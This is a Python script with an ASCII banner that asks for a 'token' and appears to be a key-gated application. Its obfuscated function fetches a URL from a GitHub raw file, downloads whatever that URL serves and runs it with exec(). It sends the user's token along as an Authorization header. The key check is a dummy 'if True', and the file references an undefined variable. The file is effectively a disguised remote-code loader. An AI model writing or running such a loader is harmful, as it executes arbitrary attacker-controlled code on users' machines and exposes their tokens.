from cryptography.fernet import Fernet
import requests
import os
from art import *
import getpass
import keyring

Art1 = text2art("MADE", font='block', chr_ignore=True)
Art2 = text2art("BY", font='block', chr_ignore=True)
Art3 = text2art("zz", font='block', chr_ignore=True)
'''
def get_secure_input(prompt):
    try:
        return getpass.getpass(prompt)
    except Exception as error:
        print(f"Error in secure input handling: {error}")
        exit()

def get_secure_key():
    privacy_key = keyring.get_password("script", "privacy_key")
    if not privacy_key:
        privacy_key = get_secure_input("enter your access to the underworld token:")
        keyring.set_password("script", "privacy_key", privacy_key)
    return privacy_key
'''

def vlllddattteee(privacy_key):  
    raw2_url  = 'https://raw.githubusercontent.com/xsjfns/raws/main/raw1.txt'

    crpppttkkyy = Fernet.generate_key()
    cipher_suite = Fernet(crpppttkkyy)
    
    cipher_text = cipher_suite.encrypt(privacy_key.encode())
    
    os.environ['crpppttkkyy'] = crpppttkkyy.decode()
    os.environ['ncrptttkkn'] = cipher_text.decode()
    
    crpppttkkyy = os.environ['crpppttkkyy']
    cipher_suite = Fernet(crpppttkkyy.encode())
    ncrptttkkn = os.environ['ncrptttkkn']
    dcrpptttknnnn = cipher_suite.decrypt(ncrptttkkn.encode()).decode()
    
    
    headers = {'Authorization': f'token {dcrpptttknnnn}'}
    
    raw2response = requests.get(raw2_url,headers=headers)
    raw2finalcontent = raw2response.text
    raw2urlfinal = raw2finalcontent
    raw2urlfinalresponse = requests.get(raw2urlfinal,headers=headers)
    if raw2urlfinalresponse.status_code == 200:  
        content2 =  raw2urlfinalresponse.text
        if True:      
            rawfile_url = 'https://raw.githubusercontent.com/xsjfns/raws/main/raw1.txt'
            rawresponse = requests.get(rawfile_url)
            rawcontent = rawresponse.text
            raw_url = rawcontent
            response = requests.get(raw_url, headers=headers)
            content = response.text
            exec(content)
        else:
            print("Invalid Key. Terminating program...")
    else:
        print(f"Failed to fetch file. Status code: {raw2urlfinalresponse.status_code}")

    if raw2urlfinalresponse.status_code != 200 or mytext not in content2:
        exit()

print(Art1)
print(Art2)
print(Art3)
print("")
print("Invalid key will terminate the application.")
privacy_key = input("enter token:")
vlllddattteee(privacy_key)
